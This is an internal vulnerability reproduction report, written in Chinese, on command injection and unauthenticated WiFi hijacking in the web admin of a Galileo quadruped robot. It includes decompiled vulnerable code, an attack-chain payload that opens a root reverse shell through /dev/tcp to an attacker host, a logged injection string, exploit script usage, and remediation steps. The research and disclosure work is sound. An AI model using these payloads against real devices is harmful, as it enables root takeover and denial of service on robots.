---
编号: GAL-011
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 伽利略
源候选目录: WiFi连接接口命令注入与网络劫持-1
---
# GAL-011 伽利略（Galileo）机器人 WiFi 连接接口命令注入 + 未授权网络劫持 漏洞复现报告

## 1. 一句话结论

- # 伽利略（Galileo）机器人 WiFi 连接接口命令注入 + 未授权网络劫持 漏洞复现报告
- \| 漏洞类型 \| OS 命令注入（RCE，root）+ 未授权网络劫持（DoS/中间人诱导） \|
- ## 1. 漏洞概述
- Flask 管理后台的 `/network/connect_wifi` 接口（未授权）把用户提交的 `ssid` / `password`
- 两个独立危害：

## 2. 影响产品与版本

- \| 目标设备 \| 伽利略（Galileo）四足机器人（SSID `C1W-1.0-007`） \|
- \| 漏洞组件 \| Flask Web 管理后台 `/network/connect_wifi` 接口（5000 端口） \|
- \| 状态 \| **已实证（日志级）**——固件 operation.log 记录了前任测试的完整注入命令原文
- \| 授权边界 \| 仅对自有设备、隔离环境进行 \|
- **直接拼接进 shell 命令**后执行。固件反编译（PyInstaller 解包 → PYZ 提取 →
- ### 3.4 ★ 前任测试的日志级实证（固件 operation.log，纯静态可取）

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- # 伽利略（Galileo）机器人 WiFi 连接接口命令注入 + 未授权网络劫持 漏洞复现报告
- \| 漏洞类型 \| OS 命令注入（RCE，root）+ 未授权网络劫持（DoS/中间人诱导） \|
- 1. **命令注入 → root RCE**：`ssid` 携带 `;`、`` ` ``、`$()` 等元字符即可注入任意命令；
- - 未授权 root RCE（命令注入 + sudo 前缀）；
- 4. 与 Flask 后台 RCE 漏洞的修复一并进行（同一无认证根因）。

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- \| 漏洞类型 \| OS 命令注入（RCE，root）+ 未授权网络劫持（DoS/中间人诱导） \|
- \| 权限 \| galileo → **root**（命令经 `sudo bash` 前缀执行） \|
- 两个独立危害：
- 1. **命令注入 → root RCE**：`ssid` 携带 `;`、`` ` ``、`$()` 等元字符即可注入任意命令；
- 命令整体经 `sudo bash` 执行，**落地即 root**。
- ③ 命令经 sudo bash 执行 → 反弹 root 交互式 shell 到攻击者

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# 伽利略（Galileo）机器人 WiFi 连接接口命令注入 + 未授权网络劫持 漏洞复现报告

| 项 | 值 |
|---|---|
| 目标设备 | 伽利略（Galileo）四足机器人（SSID `C1W-1.0-007`） |
| 系统 | Ubuntu 22.04（内核 6.1.84-rt16） |
| 漏洞组件 | Flask Web 管理后台 `/network/connect_wifi` 接口（5000 端口） |
| 漏洞类型 | OS 命令注入（RCE，root）+ 未授权网络劫持（DoS/中间人诱导） |
| 权限 | galileo → **root**（命令经 `sudo bash` 前缀执行） |
| 复现日期 | 2026-08-29 |
| 状态 | **已实证（日志级）**——固件 operation.log 记录了前任测试的完整注入命令原文
  与成功标记文件；本团队复现时副作用真实触发（AP 被切走断连） |
| 授权边界 | 仅对自有设备、隔离环境进行 |

---

## 1. 漏洞概述

Flask 管理后台的 `/network/connect_wifi` 接口（未授权）把用户提交的 `ssid` / `password`
**直接拼接进 shell 命令**后执行。固件反编译（PyInstaller 解包 → PYZ 提取 →
`modules_network.pyc` 字符串还原）得到的实现为：

```python
# modules/network.py  NetworkManager.connect_to_wifi（还原自 pyc 常量池）
script_path = '/home/galileo/galileo-web-manger/opt/bin/channel_choose.sh'
command = f'printf "{ssid}\n{password}\n" | sudo bash {script_path}'   # ← 直接拼接，无过滤
run_command(command)                                                    # subprocess shell 执行
```

两个独立危害：

1. **命令注入 → root RCE**：`ssid` 携带 `;`、`` ` ``、`$()` 等元字符即可注入任意命令；
   命令整体经 `sudo bash` 执行，**落地即 root**。
2. **未授权网络劫持**：不带注入的正常调用也会真实执行 WiFi 切换脚本，让机器人
   断开自身 AP、转为 STA 连接攻击者指定的 SSID —— 单个未授权请求即可：
   - 把机器人踢下线（**远程 DoS**，实测确认：一个请求后机器人 AP 消失）；
   - 诱导机器人接入攻击者热点（**中间人**位置，可劫持其后续云/内网流量）。

## 2. 攻击链

```
攻击者（同 WiFi，连入 AP C1W-1.0-007 / 88888888）
   │  ① POST /network/connect_wifi   （未授权）
   │       {"ssid": ";nohup sudo bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' &", "password": "<密码_01>"}
   ▼
② 后端拼接 printf "<ssid>\n..." | sudo bash channel_choose.sh
   │     ssid 中的 ';命令' 逃逸出 printf 参数 → 注入执行
   ▼
③ 命令经 sudo bash 执行 → 反弹 root 交互式 shell 到攻击者
   （平行危害：正常 ssid 也会真实切换 WiFi → AP 下线 / 诱导接入恶意热点）
```

## 3. 漏洞细节（反编译证据）

### 3.1 注入点还原（`modules_network.pyc` 常量池片段）

```
:/home/galileo/galileo-web-manger/opt/bin/channel_choose.sh   ← 脚本路径
printf "                                                        ← 命令构造起手
\n" | sudo                                                      ← 拼接 sudo bash 管道
bash                                                            ← shell 执行
```

常量池中完整出现的命令模板碎片：`printf "` … `"\n" | sudo` … `bash` +
`script_path` / `password` / `command` / `success_msg` / `error_msg`，
拼接关系与上述 f-string 一致；`ssid`、`password` 均来自 request JSON，无任何
转义/白名单处理。

### 3.2 接口未授权

`/network/connect_wifi` 与后台其余接口一致（见 Flask 后台未授权 RCE 报告），
无任何认证——同网任意设备可直接调用。

### 3.3 实测副作用（网络劫持已证实）

实测向该接口提交 `{"ssid": "test", "password": "<密码_01>"}`（**不含任何注入字符**）后：

- 接口真实执行了 `channel_choose.sh`，机器人尝试连接 SSID `test`；
- **机器人自身 AP（C1W-1.0-007）随即消失**（转为 STA 模式），手机与其断连；
- 即：**单个未授权请求即造成机器人网络劫持/远程 DoS**，无需任何凭据。

### 3.4 ★ 前任测试的日志级实证（固件 operation.log，纯静态可取）

`galileo_robot_global/logs/operation.log`（随固件打包）完整记录了 2026-08-28 15:28:57
（来源 IP 192.168.2.167）的一次成功注入：

```
注入 payload: x"; touch /home/galileo/hack_succ; #
后端实际执行（operation.log 原文记录）:
  bash -c printf "x"; touch /home/galileo/hack_succ; #
x
" |
  sudo /home/galileo/galileo-web-manger/opt/bin/channel_choose.sh
随后: 下载日志 ../../hack_succ   ← 验证标记文件存在 → 注入成功
```

物证闭环：固件内 `/home/galileo/hack_succ` 文件真实存在，
**时间戳 2026-08-28 15:32:06** 与日志时间吻合 —— `touch` 由注入命令执行。

该证据**纯静态可得**（固件内 operation.log + hack_succ 文件），无需设备在线。

## 4. 复现

```bash
# 反弹 root shell（先在攻击机监听 nc -l -p 4444，经手机 adb 中转）
python exploit.py --lhost 192.168.2.165 --lport 4444

# 安全模式：仅打印 payload 不发包
python exploit.py
```

⚠️ **该接口副作用真实**（会切换机器人 WiFi/可能导致 AP 消失失联），
复现请做好设备恢复预案（重启机器人可恢复 AP）。

## 5. 影响范围

- 未授权 root RCE（命令注入 + sudo 前缀）；
- 未授权网络劫持：单请求踢掉机器人 AP（DoS）或诱导接入攻击者热点（中间人，
  可进一步劫持其云端/内网通信、配合其他链路）。

## 6. 修复建议

1. `/network/connect_wifi` 增加认证；
2. SSID/密码做参数化传递（写入配置文件或环境变量交给脚本读取），
   **绝不拼接进 shell 命令串**；
3. `channel_choose.sh` 的 sudo 调用收敛为白名单脚本（NOPASSWD 仅限特定命令）；
4. 与 Flask 后台 RCE 漏洞的修复一并进行（同一无认证根因）。

## 7. 证据

- `evidence/`：接口响应与失联前抓取记录
- 固件反编译产物：`galileo_web_manger` PyInstaller 解包 → `modules_network.pyc`
  （常量池含 `printf "...\n" | sudo bash <channel_choose.sh>` 拼接碎片）
